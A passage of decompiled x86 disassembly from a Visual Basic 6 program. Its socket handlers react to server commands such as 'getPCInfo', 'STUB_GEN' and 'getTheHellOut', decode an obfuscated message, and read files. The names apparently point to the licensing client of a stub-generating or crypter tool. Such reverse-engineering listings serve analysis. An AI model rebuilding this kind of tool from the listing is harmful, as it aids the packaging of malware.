00814A81: add esp, 0000000Ch
00814A84: lea eax, var_7C
00814A87: push eax
00814A88: lea eax, var_6C
00814A8B: push eax
00814A8C: push 00000002h
00814A8E: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00814A93: add esp, 0000000Ch
00814A96: ret 
End Sub

Private sub sckConnect__813F24
00813F24: push ebp
00813F25: mov ebp, esp
00813F27: sub esp, 0000000Ch
00813F2A: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00813F2F: mov eax, fs:[00h]
00813F35: push eax
00813F36: mov fs:[00000000h], esp
00813F3D: push 00000044h
00813F3F: pop eax
00813F40: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00813F45: push ebx
00813F46: push esi
00813F47: push edi
00813F48: mov var_0C, esp
00813F4B: mov var_08, 0040AAE8h
00813F52: mov eax, [ebp+08h]
00813F55: and eax, 00000001h
00813F58: mov var_04, eax
00813F5B: mov eax, [ebp+08h]
00813F5E: and al, FEh
00813F60: mov [ebp+08h], eax
00813F63: mov eax, [ebp+08h]
00813F66: mov eax, [eax]
00813F68: push [ebp+08h]
00813F6B: call [eax+04h]
00813F6E: mov edx, [ebp+18h]
00813F71: lea ecx, var_1C
00813F74: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00813F79: mov edx, [ebp+1Ch]
00813F7C: lea ecx, var_18
00813F7F: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00813F84: mov eax, [ebp+08h]
00813F87: mov eax, [eax]
00813F89: push [ebp+08h]
00813F8C: call [eax+0000031Ch]
00813F92: push eax
00813F93: lea eax, var_20
00813F96: push eax
00813F97: call 00410A84h ; Set (object)
00813F9C: mov var_44, eax
00813F9F: push 00453644h ; Status: Not connected to the server
00813FA4: mov eax, var_44
00813FA7: mov eax, [eax]
00813FA9: push var_44
00813FAC: call [eax+54h]
00813FAF: fclex 
00813FB1: mov var_48, eax
00813FB4: cmp var_48, 00000000h
00813FB8: jnl 813FD1h
00813FBA: push 00000054h
00813FBC: push 004425E4h
00813FC1: push var_44
00813FC4: push var_48
00813FC7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00813FCC: mov var_54, eax
00813FCF: jmp 813FD5h
00813FD1: and var_54, 00000000h
00813FD5: lea ecx, var_20
00813FD8: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00813FDD: or var_28, FFFFFFFFh
00813FE1: mov var_30, 0000000Bh
00813FE8: push 00000010h
00813FEA: pop eax
00813FEB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00813FF0: lea esi, var_30
00813FF3: mov edi, esp
00813FF5: movsd 
00813FF6: movsd 
00813FF7: movsd 
00813FF8: movsd 
00813FF9: push 8001000Dh
00813FFE: mov eax, [ebp+08h]
00814001: mov eax, [eax]
00814003: push [ebp+08h]
00814006: call [eax+00000338h]
0081400C: push eax
0081400D: lea eax, var_20
00814010: push eax
00814011: call 00410A84h ; Set (object)
00814016: push eax
00814017: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
0081401C: lea ecx, var_20
0081401F: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00814024: mov eax, [ebp+08h]
00814027: or word ptr [eax+38h], FFFFh
0081402C: cmp word ptr [008F2500h], FFFFh
00814034: jnz 81406Bh
00814036: mov eax, [ebp+08h]
00814039: mov eax, [eax]
0081403B: push [ebp+08h]
0081403E: call [eax+00000734h]
00814044: mov var_44, eax
00814047: cmp var_44, 00000000h
0081404B: jnl 814067h
0081404D: push 00000734h
00814052: push 0044391Ch
00814057: push [ebp+08h]
0081405A: push var_44
0081405D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00814062: mov var_58, eax
00814065: jmp 81406Bh
00814067: and var_58, 00000000h
0081406B: mov var_04, 00000000h
00814072: push 00814093h
00814077: jmp 814082h
00814079: lea ecx, var_20
0081407C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00814081: ret 
End Sub

Private sub sckConnect__813849
00813849: push ebp
0081384A: mov ebp, esp
0081384C: sub esp, 00000018h
0081384F: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00813854: mov eax, fs:[00h]
0081385A: push eax
0081385B: mov fs:[00000000h], esp
00813862: mov eax, 000000BCh
00813867: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0081386C: push ebx
0081386D: push esi
0081386E: push edi
0081386F: mov var_18, esp
00813872: mov var_14, 0040AA58h
00813879: mov eax, [ebp+08h]
0081387C: and eax, 00000001h
0081387F: mov var_10, eax
00813882: mov eax, [ebp+08h]
00813885: and al, FEh
00813887: mov [ebp+08h], eax
0081388A: mov var_0C, 00000000h
00813891: mov eax, [ebp+08h]
00813894: mov eax, [eax]
00813896: push [ebp+08h]
00813899: call [eax+04h]
0081389C: mov var_04, 00000001h
008138A3: mov var_04, 00000002h
008138AA: push FFFFFFFFh
008138AC: call 00410A60h ; On Error ...
008138B1: mov var_04, 00000003h
008138B8: lea eax, var_28
008138BB: mov var_00000084, eax
008138C1: mov var_0000008C, 00004008h
008138CB: push 00000010h
008138CD: pop eax
008138CE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008138D3: lea esi, var_0000008C
008138D9: mov edi, esp
008138DB: movsd 
008138DC: movsd 
008138DD: movsd 
008138DE: movsd 
008138DF: push 00000001h
008138E1: push 00000044h
008138E3: mov eax, [ebp+08h]
008138E6: mov eax, [eax]
008138E8: push [ebp+08h]
008138EB: call [eax+00000330h]
008138F1: push eax
008138F2: lea eax, var_3C
008138F5: push eax
008138F6: call 00410A84h ; Set (object)
008138FB: push eax
008138FC: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00813901: add esp, 0000001Ch
00813904: lea ecx, var_3C
00813907: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0081390C: mov var_04, 00000004h
00813913: mov var_00000084, 004413D8h
0081391D: mov var_0000008C, 00000008h
00813927: lea edx, var_0000008C
0081392D: lea ecx, var_4C
00813930: call 004109E2h ; msvbvm60.dll.__vbaVarDup
00813935: push 00000000h
00813937: push 00000003h
00813939: lea eax, var_4C
0081393C: push eax
0081393D: push var_28
00813940: lea eax, var_5C
00813943: push eax
00813944: call 0041094Ch ; arg_1 = Split(arg_2, arg_3, arg_4, arg_5)
00813949: lea eax, var_5C
0081394C: push eax
0081394D: push 00002008h
00813952: call 0041088Ch ; msvbvm60.dll.__vbaAryVar
00813957: mov var_000000B4, eax
0081395D: lea eax, var_000000B4
00813963: push eax
00813964: lea eax, var_24
00813967: push eax
00813968: call 00410892h ; msvbvm60.dll.__vbaAryCopy
0081396D: lea eax, var_5C
00813970: push eax
00813971: lea eax, var_4C
00813974: push eax
00813975: push 00000002h
00813977: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0081397C: add esp, 0000000Ch
0081397F: mov var_04, 00000005h
00813986: push 00000000h
00813988: push var_24
0081398B: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00813990: mov edx, [eax]
00813992: lea ecx, var_000000C0
00813998: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0081399D: mov var_04, 00000006h
008139A4: push var_000000C0
008139AA: push 0044D450h ; getPCInfo
008139AF: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
008139B4: test eax, eax
008139B6: jnz 813A04h
008139B8: mov var_04, 00000007h
008139BF: push 00000001h
008139C1: push var_24
008139C4: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008139C9: push [eax]
008139CB: call 004109DCh ; Val(arg_1)
008139D0: fstp real8 ptr var_000000BC
008139D6: push 00000002h
008139D8: push var_24
008139DB: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008139E0: push [eax]
008139E2: fld real8 ptr var_000000BC
008139E8: call 00410814h ; msvbvm60.dll.__vbaFpI4
008139ED: push eax
008139EE: push 00000000h
008139F0: push var_24
008139F3: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008139F8: push [eax]
008139FA: call 0079BBE9h
008139FF: jmp 00813C82h
00813A04: mov var_04, 00000008h
00813A0B: push var_000000C0
00813A11: push 0044D718h ; userHasBeenAccepted
00813A16: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
00813A1B: test eax, eax
00813A1D: jnz 813A6Bh
00813A1F: mov var_04, 00000009h
00813A26: push 00000001h
00813A28: push var_24
00813A2B: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00813A30: push [eax]
00813A32: call 004109DCh ; Val(arg_1)
00813A37: fstp real8 ptr var_000000BC
00813A3D: push 00000002h
00813A3F: push var_24
00813A42: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00813A47: push [eax]
00813A49: fld real8 ptr var_000000BC
00813A4F: call 00410814h ; msvbvm60.dll.__vbaFpI4
00813A54: push eax
00813A55: push 00000000h
00813A57: push var_24
00813A5A: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00813A5F: push [eax]
00813A61: call 0079BBE9h
00813A66: jmp 00813C82h
00813A6B: mov var_04, 0000000Ah
00813A72: push var_000000C0
00813A78: push 0044D8D4h ; userNotAccepted
00813A7D: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
00813A82: test eax, eax
00813A84: jnz 813AD2h
00813A86: mov var_04, 0000000Bh
00813A8D: push 00000001h
00813A8F: push var_24
00813A92: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00813A97: push [eax]
00813A99: call 004109DCh ; Val(arg_1)
00813A9E: fstp real8 ptr var_000000BC
00813AA4: push 00000002h
00813AA6: push var_24
00813AA9: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00813AAE: push [eax]
00813AB0: fld real8 ptr var_000000BC
00813AB6: call 00410814h ; msvbvm60.dll.__vbaFpI4
00813ABB: push eax
00813ABC: push 00000000h
00813ABE: push var_24
00813AC1: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00813AC6: push [eax]
00813AC8: call 0079BBE9h
00813ACD: jmp 00813C82h
00813AD2: mov var_04, 0000000Ch
00813AD9: push var_000000C0
00813ADF: push 00453920h ; getTheHellOut
00813AE4: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
00813AE9: test eax, eax
00813AEB: jnz 00813BD7h
00813AF1: mov var_04, 0000000Dh
00813AF8: and word ptr var_000000B0, 0000h
00813B00: mov edx, 00445AC4h ; frmMain
00813B05: lea ecx, var_34
00813B08: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00813B0D: mov edx, 00453940h ; 2B023841010F10174D2F040C00461E022A060C0A461D1839410B174613036D000D030F1C043E151B0F121D1F63
00813B12: lea ecx, var_30
00813B15: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00813B1A: lea eax, var_000000B0
00813B20: push eax
00813B21: lea eax, var_34
00813B24: push eax
00813B25: lea eax, var_30
00813B28: push eax
00813B29: call 007AA622h
00813B2E: mov edx, eax
00813B30: lea ecx, var_38
00813B33: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00813B38: mov var_74, 80020004h
00813B3F: mov var_7C, 0000000Ah
00813B46: mov var_64, 80020004h
00813B4D: mov var_6C, 0000000Ah
00813B54: mov var_54, 80020004h
00813B5B: mov var_5C, 0000000Ah
00813B62: mov eax, var_38
00813B65: mov var_000000DC, eax
00813B6B: and var_38, 00000000h
00813B6F: mov eax, var_000000DC
00813B75: mov var_44, eax
00813B78: mov var_4C, 00000008h
00813B7F: lea eax, var_7C
00813B82: push eax
00813B83: lea eax, var_6C
00813B86: push eax
00813B87: lea eax, var_5C
00813B8A: push eax
00813B8B: push 00000000h
00813B8D: lea eax, var_4C
00813B90: push eax
00813B91: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
00813B96: lea eax, var_38
00813B99: push eax
00813B9A: lea eax, var_34
00813B9D: push eax
00813B9E: lea eax, var_30
00813BA1: push eax
00813BA2: push 00000003h
00813BA4: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00813BA9: add esp, 00000010h
00813BAC: lea eax, var_7C
00813BAF: push eax
00813BB0: lea eax, var_6C
00813BB3: push eax
00813BB4: lea eax, var_5C
00813BB7: push eax
00813BB8: lea eax, var_4C
00813BBB: push eax
00813BBC: push 00000004h
00813BBE: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00813BC3: add esp, 00000014h
00813BC6: mov var_04, 0000000Eh
00813BCD: call 00410874h ; End
00813BD2: jmp 00813C82h
00813BD7: mov var_04, 0000000Fh
00813BDE: push var_000000C0
00813BE4: push 00445F68h ; STUB_GEN
00813BE9: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
00813BEE: test eax, eax
00813BF0: jnz 813C3Bh
00813BF2: mov var_04, 00000010h
00813BF9: push 00000001h
00813BFB: push var_24
00813BFE: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00813C03: push [eax]
00813C05: call 004109DCh ; Val(arg_1)
00813C0A: fstp real8 ptr var_000000BC
00813C10: push 00000002h
00813C12: push var_24
00813C15: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00813C1A: push [eax]
00813C1C: fld real8 ptr var_000000BC
00813C22: call 00410814h ; msvbvm60.dll.__vbaFpI4
00813C27: push eax
00813C28: push 00000000h
00813C2A: push var_24
00813C2D: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
00813C32: push [eax]
00813C34: call 0079BBE9h
00813C39: jmp 813C82h
00813C3B: mov var_04, 00000012h
00813C42: mov edx, [008F20ACh]
00813C48: lea ecx, var_000000C4
00813C4E: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00813C53: mov var_04, 00000013h
00813C5A: push [008F20ACh]
00813C60: push 00442BFCh
00813C65: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
00813C6A: test eax, eax
00813C6C: jz 813C82h
00813C6E: mov var_04, 00000014h
00813C75: push var_28
00813C78: push 008F20A8h
00813C7D: call 0079BCE6h
00813C82: mov var_10, 00000000h
00813C89: wait 
00813C8A: push 00813D01h
00813C8F: jmp 813CCAh
00813C91: lea eax, var_38
00813C94: push eax
00813C95: lea eax, var_34
00813C98: push eax
00813C99: lea eax, var_30
00813C9C: push eax
00813C9D: push 00000003h
00813C9F: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00813CA4: add esp, 00000010h
00813CA7: lea ecx, var_3C
00813CAA: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00813CAF: lea eax, var_7C
00813CB2: push eax
00813CB3: lea eax, var_6C
00813CB6: push eax
00813CB7: lea eax, var_5C
00813CBA: push eax
00813CBB: lea eax, var_4C
00813CBE: push eax
00813CBF: push 00000004h
00813CC1: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00813CC6: add esp, 00000014h
00813CC9: ret 
End Sub

Private sub sckConnect__8135F4
008135F4: push ebp
008135F5: mov ebp, esp
008135F7: sub esp, 0000000Ch
008135FA: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008135FF: mov eax, fs:[00h]
00813605: push eax
00813606: mov fs:[00000000h], esp
0081360D: push 00000044h
0081360F: pop eax
00813610: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00813615: push ebx
00813616: push esi
00813617: push edi
00813618: mov var_0C, esp
0081361B: mov var_08, 0040AA48h
00813622: mov eax, [ebp+08h]
00813625: and eax, 00000001h
00813628: mov var_04, eax
0081362B: mov eax, [ebp+08h]
0081362E: and al, FEh
00813630: mov [ebp+08h], eax
00813633: mov eax, [ebp+08h]
00813636: mov eax, [eax]
00813638: push [ebp+08h]
0081363B: call [eax+04h]
0081363E: mov eax, [ebp+08h]
00813641: mov eax, [eax]
00813643: push [ebp+08h]
00813646: call [eax+0000030Ch]
0081364C: push eax
0081364D: lea eax, var_18
00813650: push eax
00813651: call 00410A84h ; Set (object)
00813656: mov var_3C, eax
00813659: push 00000000h
0081365B: mov eax, var_3C
0081365E: mov eax, [eax]
00813660: push var_3C
00813663: call [eax+5Ch]
00813666: fclex 
00813668: mov var_40, eax
0081366B: cmp var_40, 00000000h
0081366F: jnl 813688h
00813671: push 0000005Ch
00813673: push 00447A20h
00813678: push var_3C
0081367B: push var_40
0081367E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00813683: mov var_4C, eax
00813686: jmp 81368Ch
00813688: and var_4C, 00000000h
0081368C: lea ecx, var_18
0081368F: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00813694: mov eax, [ebp+08h]
00813697: mov eax, [eax]
00813699: push [ebp+08h]
0081369C: call [eax+0000030Ch]
008136A2: push eax
008136A3: lea eax, var_18
008136A6: push eax
008136A7: call 00410A84h ; Set (object)
008136AC: mov var_3C, eax
008136AF: push 00453798h ; ok
008136B4: mov eax, var_3C
008136B7: mov eax, [eax]
008136B9: push var_3C
008136BC: call [eax+74h]
008136BF: fclex 
008136C1: mov var_40, eax
008136C4: cmp var_40, 00000000h
008136C8: jnl 8136E1h
008136CA: push 00000074h
008136CC: push 00447A20h
008136D1: push var_3C
008136D4: push var_40
008136D7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008136DC: mov var_50, eax
008136DF: jmp 8136E5h
008136E1: and var_50, 00000000h
008136E5: lea ecx, var_18
008136E8: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008136ED: mov eax, [ebp+08h]
008136F0: mov eax, [eax]
008136F2: push [ebp+08h]
008136F5: call [eax+0000031Ch]
008136FB: push eax
008136FC: lea eax, var_18
008136FF: push eax
00813700: call 00410A84h ; Set (object)
00813705: mov var_3C, eax
00813708: push 00453864h ; Status: Connected to server! Communicating...
0081370D: mov eax, var_3C
00813710: mov eax, [eax]
00813712: push var_3C
00813715: call [eax+54h]
00813718: fclex 
0081371A: mov var_40, eax
0081371D: cmp var_40, 00000000h
00813721: jnl 81373Ah
00813723: push 00000054h
00813725: push 004425E4h
0081372A: push var_3C
0081372D: push var_40
00813730: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00813735: mov var_54, eax
00813738: jmp 81373Eh
0081373A: and var_54, 00000000h
0081373E: lea ecx, var_18
00813741: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00813746: push 000001F4h
0081374B: call 007D98D8h
00813750: mov eax, [ebp+08h]
00813753: mov eax, [eax]
00813755: push [ebp+08h]
00813758: call [eax+0000031Ch]
0081375E: push eax
0081375F: lea eax, var_18
00813762: push eax
00813763: call 00410A84h ; Set (object)
00813768: mov var_3C, eax
0081376B: push 004538C4h ; Status: Exchanging encryption parameters...
00813770: mov eax, var_3C
00813773: mov eax, [eax]
00813775: push var_3C
00813778: call [eax+54h]
0081377B: fclex 
0081377D: mov var_40, eax
00813780: cmp var_40, 00000000h
00813784: jnl 81379Dh
00813786: push 00000054h
00813788: push 004425E4h
0081378D: push var_3C
00813790: push var_40
00813793: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00813798: mov var_58, eax
0081379B: jmp 8137A1h
0081379D: and var_58, 00000000h
008137A1: lea ecx, var_18
008137A4: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008137A9: mov var_20, 80020004h
008137B0: mov var_28, 0000000Ah
008137B7: lea eax, var_28
008137BA: push eax
008137BB: call 004107C6h ; Randomize
008137C0: lea ecx, var_28
008137C3: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008137C8: mov var_20, 80020004h
008137CF: mov var_28, 0000000Ah
008137D6: lea eax, var_28
008137D9: push eax
008137DA: call 004107C0h ; Rnd(arg_2) 'arg_1
008137DF: fmul real4 ptr [0040AA40h]
008137E5: fadd real4 ptr [00402B54h]
008137EB: fstsw ax
008137ED: test al, 0Dh
008137EF: jnz 813844h
008137F1: call 00410814h ; msvbvm60.dll.__vbaFpI4
008137F6: push eax
008137F7: call 007D98D8h
008137FC: lea ecx, var_28
008137FF: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00813804: mov var_04, 00000000h
0081380B: wait 
0081380C: push 00813825h
00813811: jmp 813824h
00813813: lea ecx, var_18
00813816: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0081381B: lea ecx, var_28
0081381E: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00813823: ret 
End Sub

Private sub sckConnect__81348C
0081348C: push ebp
0081348D: mov ebp, esp
0081348F: sub esp, 0000000Ch
00813492: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00813497: mov eax, fs:[00h]
0081349D: push eax
0081349E: mov fs:[00000000h], esp
008134A5: push 0000003Ch
008134A7: pop eax
008134A8: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008134AD: push ebx
008134AE: push esi
008134AF: push edi
008134B0: mov var_0C, esp
008134B3: mov var_08, 0040AA30h
008134BA: mov eax, [ebp+08h]
008134BD: and eax, 00000001h
008134C0: mov var_04, eax
008134C3: mov eax, [ebp+08h]
008134C6: and al, FEh
008134C8: mov [ebp+08h], eax
008134CB: mov eax, [ebp+08h]
008134CE: mov eax, [eax]
008134D0: push [ebp+08h]
008134D3: call [eax+04h]
008134D6: mov eax, [ebp+08h]
008134D9: mov eax, [eax]
008134DB: push [ebp+08h]
008134DE: call [eax+0000031Ch]
008134E4: push eax
008134E5: lea eax, var_18
008134E8: push eax
008134E9: call 00410A84h ; Set (object)
008134EE: mov var_3C, eax
008134F1: push 00453644h ; Status: Not connected to the server
008134F6: mov eax, var_3C
008134F9: mov eax, [eax]
008134FB: push var_3C
008134FE: call [eax+54h]
00813501: fclex 
00813503: mov var_40, eax
00813506: cmp var_40, 00000000h
0081350A: jnl 813523h
0081350C: push 00000054h
0081350E: push 004425E4h
00813513: push var_3C
00813516: push var_40
00813519: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0081351E: mov var_4C, eax
00813521: jmp 813527h
00813523: and var_4C, 00000000h
00813527: lea ecx, var_18
0081352A: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0081352F: or var_20, FFFFFFFFh
00813533: mov var_28, 0000000Bh
0081353A: push 00000010h
0081353C: pop eax
0081353D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00813542: lea esi, var_28
00813545: mov edi, esp
00813547: movsd 
00813548: movsd 
00813549: movsd 
0081354A: movsd 
0081354B: push 8001000Dh
00813550: mov eax, [ebp+08h]
00813553: mov eax, [eax]
00813555: push [ebp+08h]
00813558: call [eax+00000338h]
0081355E: push eax
0081355F: lea eax, var_18
00813562: push eax
00813563: call 00410A84h ; Set (object)
00813568: push eax
00813569: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
0081356E: lea ecx, var_18
00813571: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00813576: mov eax, [ebp+08h]
00813579: and word ptr [eax+38h], 0000h
0081357E: cmp word ptr [008F2500h], FFFFh
00813586: jnz 8135BDh
00813588: mov eax, [ebp+08h]
0081358B: mov eax, [eax]
0081358D: push [ebp+08h]
00813590: call [eax+00000734h]
00813596: mov var_3C, eax
00813599: cmp var_3C, 00000000h
0081359D: jnl 8135B9h
0081359F: push 00000734h
008135A4: push 0044391Ch
008135A9: push [ebp+08h]
008135AC: push var_3C
008135AF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008135B4: mov var_50, eax
008135B7: jmp 8135BDh
008135B9: and var_50, 00000000h
008135BD: mov var_04, 00000000h
008135C4: push 008135D5h
008135C9: jmp 8135D4h
008135CB: lea ecx, var_18
008135CE: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008135D3: ret 
End Sub

Private sub unknown_812F1E
00812F1E: push ebp
00812F1F: mov ebp, esp
00812F21: sub esp, 0000000Ch
00812F24: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00812F29: mov eax, fs:[00h]
00812F2F: push eax
00812F30: mov fs:[00000000h], esp
00812F37: push 0000001Ch
00812F39: pop eax
00812F3A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00812F3F: push ebx
00812F40: push esi
00812F41: push edi
00812F42: mov var_0C, esp
00812F45: mov var_08, 0040A9C8h
00812F4C: mov var_04, 00000000h
00812F53: mov eax, [ebp+08h]
00812F56: mov eax, [eax]
00812F58: push [ebp+08h]
00812F5B: call [eax+04h]
00812F5E: push 00000000h
00812F60: push 00000004h
00812F62: lea eax, var_24
00812F65: push eax
00812F66: push 0000001Eh
00812F68: push FFFFFFFFh
00812F6A: call 0044000Ch
00812F6F: call 00410A54h ; msvbvm60.dll.__vbaSetSystemError
00812F74: push 00812F82h
00812F79: lea ecx, var_24
00812F7C: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00812F81: ret 
End Sub

Private sub unknown_812FAB
00812FAB: push ebp
00812FAC: mov ebp, esp
00812FAE: sub esp, 00000014h
00812FB1: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00812FB6: mov eax, fs:[00h]
00812FBC: push eax
00812FBD: mov fs:[00000000h], esp
00812FC4: push 00000044h
00812FC6: pop eax
00812FC7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00812FCC: push ebx
00812FCD: push esi
00812FCE: push edi
00812FCF: mov var_14, esp
00812FD2: mov var_10, 0040A9D8h
00812FD9: mov var_0C, 00000000h
00812FE0: mov var_08, 00000000h
00812FE7: mov eax, [ebp+08h]
00812FEA: mov eax, [eax]
00812FEC: push [ebp+08h]
00812FEF: call [eax+04h]
00812FF2: mov eax, [ebp+10h]
00812FF5: and [eax], 00000000h
00812FF8: push 00000001h
00812FFA: call 00410A60h ; On Error ...
00812FFF: mov eax, [ebp+0Ch]
00813002: mov var_40, eax
00813005: mov var_48, 00004008h
0081300C: push 00000000h
0081300E: lea eax, var_48
00813011: push eax
00813012: call 004107FCh ; Dir
00813017: mov edx, eax
00813019: lea ecx, var_28
0081301C: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00813021: push eax
00813022: push 00442BFCh
00813027: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0081302C: neg eax
0081302E: sbb eax, eax
00813030: inc eax
00813031: neg eax
00813033: mov var_50, ax
00813037: lea ecx, var_28
0081303A: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0081303F: movsx eax, word ptr var_50
00813043: test eax, eax
00813045: jz 813049h
00813047: jmp 8130BAh
00813049: mov var_30, 80020004h
00813050: mov var_38, 0000000Ah
00813057: lea eax, var_38
0081305A: push eax
0081305B: call 004108C2h ; FreeFile
00813060: mov var_20, ax
00813064: lea ecx, var_38
00813067: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0081306C: mov eax, [ebp+0Ch]
0081306F: push [eax]
00813071: push var_20
00813074: push FFFFFFFFh
00813076: push 00000001h
00813078: call 004108B6h ; Open #
0081307D: push var_20
00813080: call 00410B68h ; LOF(arg_1)
00813085: mov var_4C, eax
00813088: push var_20
0081308B: push var_4C
0081308E: lea eax, var_38
00813091: push eax
00813092: call 00410C28h ; msvbvm60.dll.rtcInputCharCountVar
00813097: lea eax, var_38
0081309A: push eax
0081309B: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008130A0: mov edx, eax
008130A2: lea ecx, var_24
008130A5: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008130AA: lea ecx, var_38
008130AD: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008130B2: push var_20
008130B5: call 00410898h ; Close #arg_1
008130BA: call 004109C4h ; msvbvm60.dll.__vbaExitProc
008130BF: push 008130EAh
008130C4: jmp 8130E9h
008130C6: mov eax, var_0C
008130C9: and eax, 00000004h
008130CC: test eax, eax
008130CE: jz 8130D8h
008130D0: lea ecx, var_24
008130D3: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008130D8: lea ecx, var_28
008130DB: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008130E0: lea ecx, var_38
008130E3: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008130E8: ret 
End Sub

Private sub IntegrityCount_813D20
00813D20: push ebp
00813D21: mov ebp, esp
00813D23: sub esp, 0000000Ch
00813D26: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00813D2B: mov eax, fs:[00h]
00813D31: push eax
00813D32: mov fs:[00000000h], esp
00813D39: mov eax, 00000094h
00813D3E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00813D43: push ebx
00813D44: push esi
00813D45: push edi
00813D46: mov var_0C, esp
00813D49: mov var_08, 0040AAD8h
00813D50: mov var_04, 00000000h
00813D57: mov eax, [ebp+08h]
00813D5A: mov eax, [eax]
00813D5C: push [ebp+08h]
00813D5F: call [eax+04h]
00813D62: mov eax, [ebp+0Ch]
00813D65: mov edx, [eax]
00813D67: lea ecx, var_38
00813D6A: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00813D6F: push var_38
00813D72: push 00442BFCh
00813D77: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
00813D7C: test eax, eax
00813D7E: jnz 813D85h
00813D80: jmp 00813EC9h
00813D85: push var_38
00813D88: call 0041098Eh ; Len(arg_1)
00813D8D: mov var_30, eax
00813D90: mov eax, [ebp+10h]
00813D93: push [eax]
00813D95: call 0041098Eh ; Len(arg_1)
00813D9A: mov var_1C, eax
00813D9D: mov eax, var_30
00813DA0: sub eax, var_1C
00813DA3: jo 00813F1Fh
00813DA9: add eax, 00000001h
00813DAC: jo 00813F1Fh
00813DB2: mov var_18, eax
00813DB5: mov var_50, 00000001h
00813DBC: mov var_58, 00000003h
00813DC3: and var_40, 00000000h
00813DC7: mov var_48, 00000003h
00813DCE: mov eax, [ebp+14h]
00813DD1: mov var_70, eax
00813DD4: mov var_78, 0000400Bh
00813DDB: lea eax, var_58
00813DDE: push eax
00813DDF: lea eax, var_48
00813DE2: push eax
00813DE3: lea eax, var_78
00813DE6: push eax
00813DE7: lea eax, var_68
00813DEA: push eax
